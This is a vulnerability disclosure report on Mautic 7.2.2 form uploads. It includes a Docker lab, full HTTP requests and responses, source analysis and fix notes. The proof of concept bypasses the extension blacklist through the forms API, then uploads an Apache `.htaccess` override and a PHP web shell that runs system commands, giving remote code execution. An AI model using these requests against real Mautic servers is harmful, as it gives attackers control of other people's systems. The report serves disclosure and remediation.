### Vulnerability details

**Official website / Product:** https://www.mautic.org/

**Repository:** https://github.com/mautic/mautic (stars at selection: 10889)

**Vulnerability type:** file_upload / RCE (getshell via form allow-list bypass + `.htaccess` override)

**Vulnerability versions:** 7.2.2 (Docker `mautic/mautic:7.2.2-20261026-apache`); audited source commit `f28a0120d715a441b7a6e4a688076bd7e725c862` (FormBundle sinks unchanged on that tree)

**Vulnerability URL / Parameter:** `POST /api/forms/new` field `fields[].properties.allowed_file_extensions`; impact via unauth `POST /form/submit?formId=` multipart `mauticform[<fileAlias>]` then `GET /media/files/form/{formId}/{fieldId}/shell.php`

**Complex:** yes

### Verification procedure

1. Bring up the lab with the `docker-compose.yml` below (audit path `labs/mautic-r26a3/` was removed; project name `mautic-r26a3`). Image `mautic/mautic:7.2.2-20261026-apache` + `mysql:8.4`, host port **20603→80**. In an empty working directory create mount dirs, save the compose, then start:

```bash
mkdir -p mautic/config mautic/logs mautic/media/files mautic/media/images
# save the yaml below as docker-compose.yml
docker compose -p mautic-r26a3 up -d
docker compose -p mautic-r26a3 ps
```

Expect `mautic_web` `Up (...healthy)` with port `0.0.0.0:20603->80/tcp` (verified container names like `mautic-r26a3-mautic_web-1` / `mautic-r26a3-db-1`).

```yaml
# docker-compose.yml (reconstructable lab; project name mautic-r26a3)
x-mautic-volumes: &mautic-volumes
  - ./mautic/config:/var/www/html/config:z
  - ./mautic/logs:/var/www/html/var/logs:z
  - ./mautic/media/files:/var/www/html/docroot/media/files:z
  - ./mautic/media/images:/var/www/html/docroot/media/images:z

services:
  db:
    image: mysql:8.4
    environment:
      MYSQL_ROOT_PASSWORD: changeme
      MYSQL_DATABASE: mautic_db
      MYSQL_USER: mautic_db_user
      MYSQL_PASSWORD: mautic_db_pwd
    volumes:
      - mysql-data:/var/lib/mysql
    healthcheck:
      test: mysqladmin --user=$$MYSQL_USER --password=$$MYSQL_PASSWORD ping
      start_period: 5s
      interval: 5s
      timeout: 5s
      retries: 10

  mautic_web:
    image: mautic/mautic:7.2.2-20261026-apache
    ports:
      - "20603:80"
    volumes: *mautic-volumes
    environment:
      DOCKER_MAUTIC_LOAD_TEST_DATA: "false"
      MAUTIC_DB_HOST: db
      MAUTIC_DB_PORT: 3306
      MAUTIC_DB_DATABASE: mautic_db
      MAUTIC_DB_USER: mautic_db_user
      MAUTIC_DB_PASSWORD: mautic_db_pwd
      MAUTIC_MESSENGER_DSN_EMAIL: doctrine://default
      MAUTIC_MESSENGER_DSN_HIT: doctrine://default
    healthcheck:
      test: curl -f http://localhost
      start_period: 5s
      interval: 5s
      timeout: 5s
      retries: 100
    depends_on:
      db:
        condition: service_healthy

volumes:
  mysql-data:
```

2. Install admin if the container is fresh: `docker compose -p mautic-r26a3 exec mautic_web php bin/console mautic:install http://127.0.0.1:20603 --force --admin_firstname=Admin --admin_lastname=User --admin_username=admin --admin_email=admin@example.com --admin_password='Admin123!Admin'` (DB host/user/pass already set via compose env). PoC credentials: `admin` / `Admin123!Admin` (Basic `YWRtaW46QWRtaW4xMjMhQWRtaW4=`).
3. Enable API + Basic auth in mounted `mautic/config/local.php` (inside container `/var/www/html/config/local.php`): set `'api_enabled' => 1` and `'api_enable_basic_auth' => 1`. Then `docker compose -p mautic-r26a3 exec mautic_web php bin/console cache:clear`.
4. Authenticated: `POST /api/forms/new` with a `file` field whose `allowed_file_extensions` includes `PHP` and `htaccess` (Basic auth). Note `form.id` and file `fields[].id` (verified: form `id=3`, field `id=5`, alias `uploadtest`).
5. Unauthenticated: `POST /form/submit?formId={id}` multipart upload filename `.htaccess` enabling PHP (`Require all granted` for `\.php$`).
6. Unauthenticated: same endpoint upload `shell.php` (`<?php echo "GETSHELL_OK "; echo system("id"); ?>`).
7. Unauthenticated: `GET /media/files/form/{formId}/{fieldId}/shell.php` — expect `200` and `GETSHELL_OK uid=33(www-data)...`.
8. Baseline: `GET /media/files/t.php` returns `403` without a subdirectory override. After successful uploads, container listing of `/var/www/html/docroot/media/files/form/3/5/` (verified):

```text
total 24
drwxr-xr-x 2 www-data www-data 4096 Nov  1 22:11 .
drwxr-xr-x 3 www-data www-data 4096 Nov  1 22:10 ..
-rw-r--r-- 1 www-data www-data  113 Nov  1 22:10 .htaccess
-rw-r--r-- 1 www-data www-data  113 Nov  1 22:10 bypass.htaccess
-rw-r--r-- 1 www-data www-data   49 Nov  1 22:11 shell.php
-rw-r--r-- 1 www-data www-data   49 Nov  1 22:11 shell2.PHP
```

### Complete vulnerability PoC

Setup HTTP request 1 — create form with dangerous allow-list (Docker-verified; Basic `admin:Admin123!Admin`):

```http
POST /api/forms/new HTTP/1.1
Host: 127.0.0.1:20603
Authorization: Basic YWRtaW46QWRtaW4xMjMhQWRtaW4=
Content-Type: application/json
Content-Length: 403
Accept: application/json
User-Agent: mautic-r26a3-poc
Connection: close

{"name": "UploadTest3", "formType": "standalone", "description": "poc", "isPublished": true, "fields": [{"label": "File", "type": "file", "alias": "uploadfile", "isRequired": false, "order": 1, "properties": {"allowed_file_extensions": ["PHP", "htaccess"], "allowed_file_size": 5, "public": true}}, {"label": "Submit", "type": "button", "alias": "submit", "order": 2, "properties": {"type": "submit"}}]}
```

Setup HTTP response 1:

```http
HTTP/1.1 201 Created
Date: Sun, 01 Nov 2026 22:12:58 GMT
Server: Apache/2.4.68 (Debian)
Vary: Authorization
Location: /api/forms/3
Mautic-Version: 7.2.2
Cache-Control: no-cache, private
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json

{"form":{"isPublished":true,"dateAdded":"2026-11-01T22:12:59+00:00","dateModified":"2026-11-01T22:12:59+00:00","createdBy":1,"createdByUser":"Admin User","modifiedBy":1,"modifiedByUser":"Admin User","id":3,"name":"UploadTest3","alias":"uploadtest","category":null,"description":"poc","cachedHtml":"\n\n<style type=\"text\/css\" scoped>\n    .mauticform-field-hidden { display:none }\n    .mauticform-row.mauticform-honeypot { display: none; }\n<\/style>\n<div id=\"mauticform_wrapper_uploadtest3\" class=\"mauticform_wrapper\">\n    <form autocomplete=\"false\" role=\"form\" method=\"post\" action=\"http:\/\/127.0.0.1:20603\/form\/submit?formId=3\" id=\"mauticform_uploadtest3\" data-mautic-form=\"uploadtest3\" enctype=\"multipart\/form-data\" ><div class=\"mauticform-error\" id=\"mauticform_uploadtest3_error\"><\/div>\n            <div class=\"mauticform-message\" id=\"mauticform_uploadtest3_message\"><\/div><div class=\"mauticform-innerform\">\n            <div class=\"mauticform-page-wrapper mauticform-page-1\" data-mautic-form-page=\"1\" >\n                  \n\n\n      \n  \n    \n\n\n    \n\n\n\n\n<div id=\"mauticform_uploadtest3_uploadfile\"class=\"mauticform-row mauticform-file mauticform-field-1 mauticform-100\">\n  <label id=\"mauticform_label_uploadtest3_uploadfile\"for=\"mauticform_input_uploadtest3_uploadfile\"class=\"mauticform-label\">File<\/label>\n  \n      <input type=\"file\" name=\"mauticform[uploadfile]\"value=\"\"id=\"mauticform_input_uploadtest3_uploadfile\"class=\"mauticform-input\" \/>\n  \n  <span class=\"mauticform-errormsg\" aria-live=\"polite\" aria-atomic=\"true\" aria-hidden=\"true\" style=\"display:none;\"><\/span>\n<\/div>\n\n                  \n      \n  \n    \n    \n\n\n<div id=\"mauticform_uploadtest3_submit\"class=\"mauticform-row mauticform-button-wrapper mauticform-field-2 mauticform-100\">\n  <button name=\"mauticform[submit]\"value=\"1\"id=\"mauticform_input_uploadtest3_submit\"class=\"mauticform-button\"type=\"submit\">Submit<\/button>\n<\/div>\n                  <\/div><\/div><input type=\"hidden\" name=\"mauticform[formId]\" id=\"mauticform_uploadtest3_id\" value=\"3\"\/>\n        <input type=\"hidden\" name=\"mauticform[return]\" id=\"mauticform_uploadtest3_return\" value=\"\"\/>\n        <input type=\"hidden\" name=\"mauticform[formName]\" id=\"mauticform_uploadtest3_name\" value=\"uploadtest3\"\/>\n        \n    <\/form>\n<\/div>\n","publishUp":null,"publishDown":null,"fields":[{"id":5,"label":"File","showLabel":true,"alias":"uploadfile","type":"file","defaultValue":null,"isRequired":false,"validationMessage":null,"helpMessage":null,"order":1,"properties":{"allowed_file_extensions":["PHP","htaccess"],"allowed_file_size":5,"public":true},"validation":[],"parent":null,"conditions":[],"labelAttributes":null,"inputAttributes":null,"containerAttributes":null,"leadField":null,"saveResult":true,"isAutoFill":false,"isReadOnly":false,"mappedObject":null,"mappedField":null,"fieldWidth":"100%"},{"id":6,"label":"Submit","showLabel":true,"alias":"submit","type":"button","defaultValue":null,"isRequired":false,"validationMessage":null,"helpMessage":null,"order":2,"properties":{"type":"submit"},"validation":[],"parent":null,"conditions":[],"labelAttributes":null,"inputAttributes":null,"containerAttributes":null,"leadField":null,"saveResult":true,"isAutoFill":false,"isReadOnly":false,"mappedObject":null,"mappedField":null,"fieldWidth":"100%"}],"actions":[],"template":null,"inKioskMode":false,"renderStyle":false,"formType":"standalone","postAction":"return","postActionProperty":null,"noIndex":true,"formAttributes":null,"language":null,"projects":[]}}
```

Setup HTTP request 2 — unauthenticated upload of `.htaccess` (Docker-verified):

```http
POST /form/submit?formId=3 HTTP/1.1
Host: 127.0.0.1:20603
Content-Type: multipart/form-data; boundary=----MauticPocBoundary7f3a9c
Content-Length: 696
User-Agent: mautic-r26a3-poc
Accept: */*
Connection: close

------MauticPocBoundary7f3a9c
Content-Disposition: form-data; name="mauticform[uploadfile]"; filename=".htaccess"
Content-Type: application/octet-stream

<IfModule authz_core_module>
    <FilesMatch "\.php$">
        Require all granted
    </FilesMatch>
</IfModule>

------MauticPocBoundary7f3a9c
Content-Disposition: form-data; name="mauticform[submit]"

1
------MauticPocBoundary7f3a9c
Content-Disposition: form-data; name="mauticform[formId]"

3
------MauticPocBoundary7f3a9c
Content-Disposition: form-data; name="mauticform[return]"


------MauticPocBoundary7f3a9c
Content-Disposition: form-data; name="mauticform[formName]"

uploadtest
------MauticPocBoundary7f3a9c--
```

Setup HTTP response 2:

```http
HTTP/1.1 302 Found
Date: Sun, 01 Nov 2026 22:12:59 GMT
Server: Apache/2.4.68 (Debian)
Cache-Control: max-age=0, must-revalidate, private
Location: /form/message
Expires: Sun, 01 Nov 2026 22:12:59 GMT
Set-Cookie: mautic_device_id=f80bxdvndzhyb0obkv6cwsu; expires=Mon, 01 Nov 2027 22:12:59 GMT; Max-Age=31536000; path=/; secure; samesite=none
Set-Cookie: mtc_id=7; path=/; secure; samesite=none
Set-Cookie: 8d926923a94440b6977281887a8004b4=0d8bb15eb78d82181f4bf48753c4d278; path=/; httponly; samesite=lax
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='/form/message'" />

        <title>Redirecting to /form/message</title>
    </head>
    <body>
        Redirecting to <a href="/form/message">/form/message</a>.
    </body>
</html>
```

Setup HTTP request 3 — unauthenticated upload of `shell.php` (Docker-verified):

```http
POST /form/submit?formId=3 HTTP/1.1
Host: 127.0.0.1:20603
Content-Type: multipart/form-data; boundary=----MauticPocBoundary8a1b2c
Content-Length: 624
User-Agent: mautic-r26a3-poc
Accept: */*
Connection: close

------MauticPocBoundary8a1b2c
Content-Disposition: form-data; name="mauticform[uploadfile]"; filename="shell.php"
Content-Type: application/x-php

<?php echo "GETSHELL_OK "; echo system("id"); ?>
------MauticPocBoundary8a1b2c
Content-Disposition: form-data; name="mauticform[submit]"

1
------MauticPocBoundary8a1b2c
Content-Disposition: form-data; name="mauticform[formId]"

3
------MauticPocBoundary8a1b2c
Content-Disposition: form-data; name="mauticform[return]"


------MauticPocBoundary8a1b2c
Content-Disposition: form-data; name="mauticform[formName]"

uploadtest
------MauticPocBoundary8a1b2c--
```

Setup HTTP response 3:

```http
HTTP/1.1 302 Found
Date: Sun, 01 Nov 2026 22:12:59 GMT
Server: Apache/2.4.68 (Debian)
Cache-Control: max-age=0, must-revalidate, private
Location: /form/message
Expires: Sun, 01 Nov 2026 22:12:59 GMT
Set-Cookie: mautic_device_id=m7sjrg51uwyrrxhh59k2uof; expires=Mon, 01 Nov 2027 22:12:59 GMT; Max-Age=31536000; path=/; secure; samesite=none
Set-Cookie: mtc_id=8; path=/; secure; samesite=none
Set-Cookie: 8d926923a94440b6977281887a8004b4=129556adeb64372bd4d95b6003128d7e; path=/; httponly; samesite=lax
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='/form/message'" />

        <title>Redirecting to /form/message</title>
    </head>
    <body>
        Redirecting to <a href="/form/message">/form/message</a>.
    </body>
</html>
```

Impact HTTP request — execute uploaded PHP (Docker-verified):

```http
GET /media/files/form/3/5/shell.php HTTP/1.1
Host: 127.0.0.1:20603
User-Agent: mautic-r26a3-poc
Accept: */*
Connection: close
```

Impact HTTP response:

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 22:12:59 GMT
Server: Apache/2.4.68 (Debian)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

GETSHELL_OK uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Verification result notes:

- Form create returned `201` with `id=3`, file field `id=5`, properties `allowed_file_extensions:["PHP","htaccess"]`.
- Both public uploads returned `302` to `/form/message`.
- Container listing showed `.htaccess` + `shell.php` under `/var/www/html/docroot/media/files/form/3/5/` (see step 8 listing).
- `GET /media/files/form/3/5/shell.php` returned `200` with body:

```text
GETSHELL_OK uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- `GET /media/files/t.php` returned `403` (docroot deny).

### Vulnerability analysis

Mautic FormBundle stores public form uploads under `%application_dir%/media/files/form/{formId}/{fieldId}/` inside the Apache document root (`FormUploader::getUploadDirOfForm` / `form_upload_dir`).

When an admin configures a file field, UI type `FormFieldFileType` attaches `FileExtensionConstraint`, whose validator does a **case-sensitive** `array_intersect` against `blacklisted_extensions` (`['php','sh']` in `FormBundle/Config/config.php`). Supplying `PHP` (or any non-listed dangerous extension such as `htaccess`, `phtml`) passes the UI check. **`POST /api/forms/new` never runs that Symfony form type**, so the allow-list is attacker-chosen with no blacklist enforcement at create time.

On public `POST /form/submit`, `UploadFieldValidator` only checks the uploaded extension against the field’s stored `allowed_file_extensions` (via `FileUploadValidator::checkExtension`, which lowercases both sides). It does **not** re-check `blacklisted_extensions`. `FilePathResolver` preserves client names (including leading-dot `.htaccess`) under the web tree.

Official `mautic/mautic:*-apache` images enable `AllowOverride All` for `${APACHE_DOCUMENT_ROOT}` (`docker-php.conf`). Docroot `.htaccess` denies `\.php$` except `index|upgrade`, but a uploaded subdirectory `.htaccess` with `FilesMatch "\.php$" Require all granted` overrides that deny. Subsequent `shell.php` is executed by mod_php as `www-data`.

Requires credentials that can create/publish forms (API basic auth or UI). After the form is published, upload + RCE steps are unauthenticated.

Trigger / sink source (full path and line numbers):

```php
# File: app/bundles/FormBundle/Validator/Constraint/FileExtensionConstraintValidator.php
# Lines: 22-36 (commit f28a0120d715a441b7a6e4a688076bd7e725c862)
public function validate($value, Constraint $constraint): void
{
    if (!is_array($value)) {
        $this->context->buildViolation($constraint->message)
            ->setParameter('{{ forbidden }}', '')
            ->addViolation();
    }

    $blacklistedExtensions = $this->coreParametersHelper->get('blacklisted_extensions');
    $intersect             = array_intersect($value, $blacklistedExtensions);
    if ([] !== $intersect) {
        $this->context->buildViolation($constraint->message)
            ->setParameter('{{ forbidden }}', implode(', ', $intersect))
            ->addViolation();
    }
}
```

```php
# File: app/bundles/FormBundle/Config/config.php
# Lines: 142-144
'parameters' => [
    'form_upload_dir'              => '%mautic.application_dir%/media/files/form',
    'blacklisted_extensions'       => ['php', 'sh'],
```

```php
# File: app/bundles/FormBundle/Validator/UploadFieldValidator.php
# Lines: 37-45
$properties = $field->getProperties();

$maxUploadSize     = $properties[FormFieldFileType::PROPERTY_ALLOWED_FILE_SIZE];
$allowedExtensions = $properties[FormFieldFileType::PROPERTY_ALLOWED_FILE_EXTENSIONS];

try {
    $this->fileUploadValidator->validate($file->getSize(), $file->getClientOriginalExtension(), $maxUploadSize, $allowedExtensions, 'mautic.form.submission.error.file.extension', 'mautic.form.submission.error.file.size');

    return $file;
```

```php
# File: app/bundles/FormBundle/Helper/FormUploader.php
# Lines: 102-117
private function getUploadDir(Field $field): string
{
    $fieldId       = $field->getId();
    $formUploadDir = $this->getUploadDirOfForm($field->getForm()->getId());

    return $formUploadDir.DIRECTORY_SEPARATOR.$fieldId;
}

private function getUploadDirOfForm(int $formId): string
{
    $uploadDir = $this->coreParametersHelper->get('form_upload_dir');

    return $uploadDir.DIRECTORY_SEPARATOR.$formId;
}
```

### Fix notes

- Enforce `blacklisted_extensions` (case-insensitive) on every write path for `allowed_file_extensions`, including Form API create/edit — not only `FormFieldFileType`.
- Expand blacklist to cover `htaccess`, `phtml`, `php*`, `phar`, `shtml`, etc., or switch to a strict allow-list of safe types.
- On submit, reject uploads whose extension is blacklisted even if present in the field allow-list.
- Refuse to store `.htaccess` / `.user.ini` / `.htpasswd` under web-accessible upload dirs; strip leading dots or store outside docroot and serve via authenticated download only.
- Prefer `AllowOverride None` for `media/` (or disable PHP engine in that tree via Apache/PHP-FPM pool).

